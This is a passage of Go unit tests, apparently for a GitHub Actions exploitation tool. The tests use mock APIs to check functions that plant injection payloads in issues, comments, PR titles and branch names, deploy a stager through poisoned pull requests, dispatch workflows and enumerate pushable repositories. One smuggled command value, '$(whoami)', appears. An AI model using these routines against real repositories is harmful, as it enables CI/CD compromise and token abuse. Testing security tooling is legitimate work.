		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/issues/1","number":1}`, owner, repo)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `[]`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues/{number}/comments", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"id":1}`)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/actions/workflows/{workflow}", func(w http.ResponseWriter, r *http.Request) {
		workflow := r.PathValue("workflow")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"id":1,"name":"%s","path":".github/workflows/%s","state":"active"}`, workflow, workflow)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/actions/workflows/{workflow}/dispatches", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	})

	mux.HandleFunc("GET /repos/{owner}/{repo}/actions/workflows", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"total_count":0,"workflows":[]}`)
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/forks", func(w http.ResponseWriter, r *http.Request) {
		forkRepo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusAccepted)
		fmt.Fprintf(w, `{"owner":{"login":"testuser"},"name":"%s","full_name":"testuser/%s","default_branch":"main"}`, forkRepo, forkRepo)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, _ := url.Parse(srv.URL + "/")
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL

	return srv, &gitHubClient{client: client, token: "test-token"}
}

// =============================================================================
// Deployment Method Tests (with mock GitHub API)
// =============================================================================

func TestDeployIssue_TitleInjection(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "issue_title",
	}

	issueURL, err := ghClient.deployIssue(context.Background(), vuln, "$(whoami)", false)
	require.NoError(t, err)
	assert.Contains(t, issueURL, "github.com/acme/api/issues")
}

func TestDeployIssue_UsesExploitUserAgent(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, gitHubExploitUserAgent(), r.Header.Get("User-Agent"))
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"html_url":"https://github.com/acme/api/issues/1","number":1}`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(srv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	ghClient := newGitHubDeployClient("ghp_test")
	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "issue_body",
	}

	issueURL, err := ghClient.deployIssue(context.Background(), vuln, "payload", false)
	require.NoError(t, err)
	assert.Equal(t, "https://github.com/acme/api/issues/1", issueURL)
}

func TestDeployIssue_BodyInjection(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "issue_body",
	}

	issueURL, err := ghClient.deployIssue(context.Background(), vuln, "injected body content", false)
	require.NoError(t, err)
	assert.Contains(t, issueURL, "github.com/acme/api/issues")
}

func TestDeployIssue_CommentMode(t *testing.T) {
	var createdIssue, createdComment bool
	mux := http.NewServeMux()

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		createdIssue = true
		var body map[string]string
		_ = json.NewDecoder(r.Body).Decode(&body)
		assert.NotEqual(t, "injected payload", body["body"], "issue body should not contain payload in comment mode")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/issues/1","number":1}`, r.PathValue("owner"), r.PathValue("repo"))
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues/{number}/comments", func(w http.ResponseWriter, r *http.Request) {
		createdComment = true
		var body map[string]string
		_ = json.NewDecoder(r.Body).Decode(&body)
		assert.Equal(t, "injected payload", body["body"], "comment body should be the payload")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"id":1}`)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, _ := url.Parse(srv.URL + "/")
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL
	ghClient := &gitHubClient{client: client, token: "test-token"}

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "comment.body",
	}

	issueURL, err := ghClient.deployIssue(context.Background(), vuln, "injected payload", true)
	require.NoError(t, err)
	assert.Contains(t, issueURL, "github.com/acme/api/issues")
	assert.True(t, createdIssue, "should create a benign issue first")
	assert.True(t, createdComment, "should add payload as comment")
}

func TestDeployIssue_CommentMode_RetriesTransientCommentValidationFailure(t *testing.T) {
	var commentAttempts int
	mux := http.NewServeMux()

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/issues/1","number":1}`, r.PathValue("owner"), r.PathValue("repo"))
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues/{number}/comments", func(w http.ResponseWriter, _ *http.Request) {
		commentAttempts++
		w.Header().Set("Content-Type", "application/json")
		if commentAttempts == 1 {
			w.WriteHeader(http.StatusUnprocessableEntity)
			fmt.Fprint(w, `{"message":"Validation Failed","errors":[{"resource":"IssueComment","field":"data","code":"unprocessable","message":"Could not resolve to a node with the global id of 'I_kwDOQ-jpaM72Na2a'."}]}`)
			return
		}
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"id":1}`)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, _ := url.Parse(srv.URL + "/")
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL
	ghClient := &gitHubClient{client: client, token: "test-token"}

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "comment.body",
	}

	issueURL, err := ghClient.deployIssue(context.Background(), vuln, "injected payload", true)
	require.NoError(t, err)
	assert.Contains(t, issueURL, "github.com/acme/api/issues")
	assert.Equal(t, 2, commentAttempts)
}

func TestDeployIssue_CommentMode_CleansUpIssueOnCommentFailure(t *testing.T) {
	var createdIssue, closedIssue bool
	mux := http.NewServeMux()

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		createdIssue = true
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/issues/1","number":1}`, r.PathValue("owner"), r.PathValue("repo"))
	})

	mux.HandleFunc("POST /repos/{owner}/{repo}/issues/{number}/comments", func(w http.ResponseWriter, _ *http.Request) {
		http.Error(w, "forbidden", http.StatusForbidden)
	})

	mux.HandleFunc("PATCH /repos/{owner}/{repo}/issues/{number}", func(w http.ResponseWriter, _ *http.Request) {
		closedIssue = true
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, `{"state":"closed"}`)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	baseURL, _ := url.Parse(srv.URL + "/")
	tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: "test-token"}))
	client := github.NewClient(tc)
	client.BaseURL = baseURL
	ghClient := &gitHubClient{client: client, token: "test-token"}

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "comment.body",
	}

	_, err := ghClient.deployIssue(context.Background(), vuln, "injected payload", true)
	require.Error(t, err)
	assert.True(t, createdIssue)
	assert.True(t, closedIssue)
	assert.Contains(t, err.Error(), "failed to add comment to issue")
}

func TestDeployIssue_InvalidRepo(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "noslash",
		Workflow:   "ci.yml",
		Context:    "issue_body",
	}

	_, err := ghClient.deployIssue(context.Background(), vuln, "payload", false)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "invalid repository")
}

func TestDeployComment_WithExistingIssueNumber(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository:  "acme/api",
		Workflow:    "ci.yml",
		Context:     "issue_comment",
		IssueNumber: 42,
	}

	result, err := ghClient.deployComment(context.Background(), vuln, "injected comment", "")
	require.NoError(t, err)
	assert.Contains(t, result.CommentURL, "acme/api/issues/42")
	assert.Empty(t, result.CreatedIssueURL, "Should not set CreatedIssueURL for existing issue")
}

func TestDeployComment_WithExistingPRNumber(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository:  "acme/api",
		Workflow:    "ci.yml",
		Context:     "issue_comment",
		IssueNumber: 42,
	}

	result, err := ghClient.deployComment(context.Background(), vuln, "injected comment", "pull_request")
	require.NoError(t, err)
	assert.Contains(t, result.CommentURL, "acme/api/pull/42")
	assert.Empty(t, result.CreatedPRURL)
}

func TestDeployComment_CreatesIssueWhenNoneExist(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "issue_comment",
	}

	result, err := ghClient.deployComment(context.Background(), vuln, "injected comment", "")
	require.NoError(t, err)
	assert.Contains(t, result.CommentURL, "acme/api/issues/")
	assert.NotEmpty(t, result.CreatedIssueURL, "Should set CreatedIssueURL when creating a new issue")
}

func TestDeployComment_CreatesStubPRWhenRequested(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "issue_comment",
	}

	result, err := ghClient.deployComment(context.Background(), vuln, "injected comment", "stub_pull_request")
	require.NoError(t, err)
	assert.Contains(t, result.CommentURL, "acme/api/pull/")
	assert.NotEmpty(t, result.CreatedPRURL)
}

func TestDeployComment_InvalidRepo(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "noslash",
		Workflow:   "ci.yml",
		Context:    "issue_comment",
	}

	_, err := ghClient.deployComment(context.Background(), vuln, "payload", "")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "invalid repository")
}

func TestTriggerWorkflowDispatch(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	err := ghClient.triggerWorkflowDispatch(context.Background(), "acme", "api", "ci.yml", "main", map[string]interface{}{"key": "value"})
	assert.NoError(t, err)
}

func TestTriggerWorkflowDispatch_NoInputs(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	err := ghClient.triggerWorkflowDispatch(context.Background(), "acme", "api", "ci.yml", "main", nil)
	assert.NoError(t, err)
}

func TestListAccessibleRepos(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /user/repos", func(w http.ResponseWriter, r *http.Request) {
		assert.NotContains(t, r.Header.Get("User-Agent"), gitHubExploitUserAgentID)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `[{"full_name":"acme/api"},{"full_name":"acme/web"}]`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	baseURL, _ := url.Parse(srv.URL + "/")
	client := github.NewClient(nil)
	client.BaseURL = baseURL
	ghClient := &gitHubClient{client: client, token: "test"}

	repos, err := ghClient.listAccessibleRepos(context.Background())
	require.NoError(t, err)
	assert.Equal(t, []string{"acme/api", "acme/web"}, repos)
}

func TestListAccessibleReposWithInfo(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /user/repos", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `[{"full_name":"acme/api","private":true,"permissions":{"push":true}},{"full_name":"acme/web","private":false,"permissions":{"push":false}}]`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	baseURL, _ := url.Parse(srv.URL + "/")
	client := github.NewClient(nil)
	client.BaseURL = baseURL
	ghClient := &gitHubClient{client: client, token: "test"}

	repos, err := ghClient.listAccessibleReposWithInfo(context.Background())
	require.NoError(t, err)
	require.Len(t, repos, 2)
	assert.Equal(t, "acme/api", repos[0].FullName)
	assert.True(t, repos[0].IsPrivate)
	assert.True(t, repos[0].CanPush)
	assert.False(t, repos[1].IsPrivate)
	assert.False(t, repos[1].CanPush)
}

func TestViewerPermissionCanPush(t *testing.T) {
	tests := []struct {
		name       string
		permission string
		want       bool
	}{
		{name: "admin", permission: "ADMIN", want: true},
		{name: "maintain", permission: "MAINTAIN", want: true},
		{name: "write", permission: "WRITE", want: true},
		{name: "read", permission: "READ", want: false},
		{name: "triage", permission: "TRIAGE", want: false},
		{name: "empty", permission: "", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, viewerPermissionCanPush(tt.permission))
		})
	}
}

func TestListOwnerReposWithInfoGraphQL(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("POST /graphql", func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Variables map[string]interface{} `json:"variables"`
		}
		require.NoError(t, json.NewDecoder(r.Body).Decode(&req))
		w.Header().Set("Content-Type", "application/json")
		switch req.Variables["cursor"] {
		case nil:
			fmt.Fprint(w, `{"data":{"repositoryOwner":{"repositories":{"pageInfo":{"hasNextPage":true,"endCursor":"cursor-2"},"nodes":[{"nameWithOwner":"acme/api","isPrivate":true,"viewerPermission":"WRITE"},{"nameWithOwner":"acme/web","isPrivate":false,"viewerPermission":"READ"}]}}}}`)
		case "cursor-2":
			fmt.Fprint(w, `{"data":{"repositoryOwner":{"repositories":{"pageInfo":{"hasNextPage":false,"endCursor":""},"nodes":[{"nameWithOwner":"acme/ops","isPrivate":true,"viewerPermission":"ADMIN"}]}}}}`)
		default:
			t.Fatalf("unexpected cursor: %#v", req.Variables["cursor"])
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	ghClient := &gitHubClient{
		client:     github.NewClient(nil),
		token:      "test",
		graphqlURL: srv.URL + "/graphql",
	}

	repos, err := ghClient.listOwnerReposWithInfoGraphQL(context.Background(), "acme")
	require.NoError(t, err)
	require.Len(t, repos, 3)
	assert.Equal(t, "acme/api", repos[0].FullName)
	assert.True(t, repos[0].IsPrivate)
	assert.True(t, repos[0].CanPush)
	assert.False(t, repos[1].CanPush)
	assert.True(t, repos[2].CanPush)
}

func TestGetAuthenticatedUser(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	login, resp, err := ghClient.getAuthenticatedUser(context.Background())
	require.NoError(t, err)
	assert.Equal(t, "testuser", login)
	assert.NotNil(t, resp)
}

func TestGetDefaultBranch(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	branch, err := ghClient.getDefaultBranch(context.Background(), "acme", "api")
	require.NoError(t, err)
	assert.Equal(t, "main", branch)
}

func TestCreateBranch(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	err := ghClient.createBranch(context.Background(), "acme", "api", "main", "feature-branch")
	assert.NoError(t, err)
}

func TestCreateCommit_PRTitleContext(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{Context: "pr_title", Workflow: "ci.yml"}
	err := ghClient.createCommit(context.Background(), "acme", "api", "feature", "test commit", vuln)
	assert.NoError(t, err)
}

func TestCreateCommit_DefaultContext(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{Context: "issue_body", Workflow: "ci.yml"}
	err := ghClient.createCommit(context.Background(), "acme", "api", "feature", "test commit", vuln)
	assert.NoError(t, err)
}

func TestListWorkflowsWithDispatch_Empty(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	workflows, err := ghClient.listWorkflowsWithDispatch(context.Background(), "acme", "api")
	require.NoError(t, err)
	assert.Empty(t, workflows)
}

func TestDeployVulnerability_PRTitleContext(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "pr_title",
	}

	prURL, err := ghClient.deployVulnerability(context.Background(), vuln, "$(whoami)", true)
	require.NoError(t, err)
	assert.Contains(t, prURL, "github.com/acme/api/pull")
}

func TestDeployVulnerability_GitBranchContext(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "acme/api",
		Workflow:   "ci.yml",
		Context:    "git_branch",
	}

	prURL, err := ghClient.deployVulnerability(context.Background(), vuln, "evil-branch-name", true)
	require.NoError(t, err)
	assert.Contains(t, prURL, "github.com/acme/api/pull")
}

func TestDeployVulnerability_InvalidRepo(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	vuln := &VulnerabilityInfo{
		Repository: "noslash",
		Workflow:   "ci.yml",
		Context:    "pr_title",
	}

	_, err := ghClient.deployVulnerability(context.Background(), vuln, "payload", true)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "invalid repository")
}

func TestDeployLOTP_DynamicBash(t *testing.T) {
	srv, ghClient := newMockGitHubAPI(t)

	prURL, err := ghClient.deployLOTP(context.Background(), nil, "acme/api", srv.URL, "stager1", "bash", []string{"scripts/build.sh"}, true)
	require.NoError(t, err)
	assert.Contains(t, prURL, "github.com/acme/api/pull")
}

func TestDeployLOTP_NoToolSpecified(t *testing.T) {
	srv, ghClient := newMockGitHubAPI(t)

	_, err := ghClient.deployLOTP(context.Background(), nil, "acme/api", srv.URL, "stager1", "", nil, true)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "LOTP tool not specified")
}

func TestDeployLOTP_InvalidRepo(t *testing.T) {
	srv, ghClient := newMockGitHubAPI(t)

	_, err := ghClient.deployLOTP(context.Background(), nil, "noslash", srv.URL, "stager1", "bash", nil, true)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "invalid repository")
}

func TestDeployLOTP_UnsupportedTool(t *testing.T) {
	srv, ghClient := newMockGitHubAPI(t)

	_, err := ghClient.deployLOTP(context.Background(), nil, "acme/api", srv.URL, "stager1", "nonexistent_tool_xyz", nil, true)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "unsupported LOTP tool")
}

func TestDeployLOTP_InvalidKitchenURL(t *testing.T) {
	_, ghClient := newMockGitHubAPI(t)

	_, err := ghClient.deployLOTP(context.Background(), nil, "acme/api", "://invalid", "stager1", "bash", nil, true)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "invalid kitchen URL")
}

// =============================================================================
// fetchTokenInfoRaw with mock HTTP server
// =============================================================================

func TestFetchTokenInfoRaw_Success(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "Bearer ghp_testtoken", r.Header.Get("Authorization"))
		w.Header().Set("X-OAuth-Scopes", "repo, workflow")
		w.Header().Set("X-RateLimit-Limit", "5000")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"login":"testuser"}`)
	}))
	defer srv.Close()

	origFunc := fetchTokenInfoRaw
	_ = origFunc

	info, err := fetchTokenInfoFromURL(context.Background(), "ghp_testtoken", srv.URL+"/user")
	require.NoError(t, err)
	assert.Equal(t, "testuser", info.Owner)
	assert.Equal(t, []string{"repo", "workflow"}, info.Scopes)
	assert.Equal(t, 5000, info.RateLimitMax)
	assert.Equal(t, "classic_pat", info.TokenType)
	assert.Equal(t, http.StatusOK, info.StatusCode)
}

func TestFetchTokenInfoRaw_Unauthorized(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
		fmt.Fprint(w, `{"message":"Bad credentials"}`)
	}))
	defer srv.Close()

	info, err := fetchTokenInfoFromURL(context.Background(), "bad_token", srv.URL+"/user")
	require.NoError(t, err)
	assert.Equal(t, http.StatusUnauthorized, info.StatusCode)
	assert.Empty(t, info.Owner)
}

func fetchTokenInfoFromURL(ctx context.Context, token, apiURL string) (*FetchTokenInfoResponse, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", apiURL, http.NoBody)
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("fetch user: %w", err)
	}
	defer resp.Body.Close()

	info := &FetchTokenInfoResponse{
		StatusCode: resp.StatusCode,
	}

	if scopes := resp.Header.Get("X-OAuth-Scopes"); scopes != "" {
		for _, s := range strings.Split(scopes, ",") {
			if s = strings.TrimSpace(s); s != "" {
				info.Scopes = append(info.Scopes, s)
			}
		}
	}

	if limit := resp.Header.Get("X-RateLimit-Limit"); limit != "" {
		_, _ = fmt.Sscanf(limit, "%d", &info.RateLimitMax)
	}

	info.TokenType = detectTokenTypePrefix(token)

	if resp.StatusCode == http.StatusOK {
		var user struct {
			Login string `json:"login"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&user); err == nil {
			info.Owner = user.Login
		}
	}

	return info, nil
}

// =============================================================================
// Handler success path tests (with mock GitHub API)
// =============================================================================

func newGitHubTestHandlerWithMock(t *testing.T) (*Handler, *http.ServeMux, *httptest.Server) {
	t.Helper()
	mockGH := http.NewServeMux()

	mockGH.HandleFunc("GET /user", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-OAuth-Scopes", "repo, workflow")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"login":"testuser","id":1}`)
	})
	mockGH.HandleFunc("GET /user/repos", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `[{"full_name":"acme/api","private":false,"permissions":{"push":true}}]`)
	})
	mockGH.HandleFunc("GET /repos/{owner}/{repo}/actions/workflows/{workflow}", func(w http.ResponseWriter, r *http.Request) {
		workflow := r.PathValue("workflow")
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"id":1,"name":"%s","path":".github/workflows/%s","state":"active"}`, workflow, workflow)
	})
	mockGH.HandleFunc("POST /repos/{owner}/{repo}/actions/workflows/{workflow}/dispatches", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	})
	mockGH.HandleFunc("GET /repos/{owner}/{repo}/actions/workflows", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"total_count":0,"workflows":[]}`)
	})
	mockGH.HandleFunc("POST /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		owner := r.PathValue("owner")
		repo := r.PathValue("repo")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"html_url":"https://github.com/%s/%s/issues/1","number":1}`, owner, repo)
	})
	mockGH.HandleFunc("GET /repos/{owner}/{repo}/issues", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `[]`)
	})
	mockGH.HandleFunc("POST /repos/{owner}/{repo}/issues/{number}/comments", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"id":1}`)
	})

	ghSrv := httptest.NewServer(mockGH)
	t.Cleanup(ghSrv.Close)

	origNewClient := newGitHubClient
	_ = origNewClient

	mock := &mockPublisher{}
	h, mux := newTestHandler(mock, nil)

	return h, mux, ghSrv
}

func TestHandlerDeployDispatch_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	body := `{"token":"ghp_test","owner":"acme","repo":"api","workflow_file":"ci.yml","ref":"main"}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/dispatch", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	assert.Contains(t, rec.Body.String(), `"status":"ok"`)
}

func TestHandlerDeployDispatch_PreflightNotFound(t *testing.T) {
	mockGH := http.NewServeMux()
	mockGH.HandleFunc("GET /repos/{owner}/{repo}/actions/workflows/{workflow}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"message":"Not Found"}`)
	})

	ghSrv := httptest.NewServer(mockGH)
	t.Cleanup(ghSrv.Close)

	_, mux := newGitHubTestHandler()
	swapGitHubClient(t, ghSrv.URL)

	body := `{"token":"ghp_test","owner":"acme","repo":"api","workflow_file":"nonexistent.yml","ref":"main"}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/dispatch", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusInternalServerError, rec.Code)
	var resp gitHubErrorResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Contains(t, resp.Error, "preflight:")
	assert.Contains(t, resp.Error, "404")
}

func TestHandlerDeployDispatch_PreflightForbidden(t *testing.T) {
	mockGH := http.NewServeMux()
	mockGH.HandleFunc("GET /repos/{owner}/{repo}/actions/workflows/{workflow}", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusForbidden)
		fmt.Fprint(w, `{"message":"Resource not accessible by integration"}`)
	})

	ghSrv := httptest.NewServer(mockGH)
	t.Cleanup(ghSrv.Close)

	_, mux := newGitHubTestHandler()
	swapGitHubClient(t, ghSrv.URL)

	body := `{"token":"ghp_test","owner":"acme","repo":"api","workflow_file":"ci.yml","ref":"main"}`
	req := httptest.NewRequest(http.MethodPost, "/github/deploy/dispatch", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusInternalServerError, rec.Code)
	var resp gitHubErrorResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Contains(t, resp.Error, "preflight:")
	assert.Contains(t, resp.Error, "403")
}

func TestHandlerDeployDispatch_MissingFields(t *testing.T) {
	_, mux := newGitHubTestHandler()

	tests := []struct {
		name string
		body string
	}{
		{"missing owner", `{"token":"ghp_test","owner":"","repo":"api","workflow_file":"ci.yml","ref":"main"}`},
		{"missing repo", `{"token":"ghp_test","owner":"acme","repo":"","workflow_file":"ci.yml","ref":"main"}`},
		{"missing workflow_file", `{"token":"ghp_test","owner":"acme","repo":"api","workflow_file":"","ref":"main"}`},
		{"missing ref", `{"token":"ghp_test","owner":"acme","repo":"api","workflow_file":"ci.yml","ref":""}`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, "/github/deploy/dispatch", strings.NewReader(tt.body))
			rec := httptest.NewRecorder()
			mux.ServeHTTP(rec, req)
			assert.Equal(t, http.StatusBadRequest, rec.Code)
			assert.Contains(t, rec.Body.String(), "owner, repo, workflow_file, and ref are required")
		})
	}
}

func TestHandlerListRepos_Success(t *testing.T) {
	_, mux, ghSrv := newGitHubTestHandlerWithMock(t)

	origNew := newGitHubClientFunc
	newGitHubClientFunc = func(token string) *gitHubClient {
		baseURL, _ := url.Parse(ghSrv.URL + "/")
		tc := oauth2.NewClient(context.Background(), oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token}))
		c := github.NewClient(tc)
		c.BaseURL = baseURL
		return &gitHubClient{client: c, token: token}
	}
	t.Cleanup(func() { newGitHubClientFunc = origNew })

	body := `{"token":"ghp_test"}`
	req := httptest.NewRequest(http.MethodPost, "/github/repos", strings.NewReader(body))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	assert.Equal(t, http.StatusOK, rec.Code)
	var resp ListReposResponse
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.Equal(t, []string{"acme/api"}, resp.Repos)
}

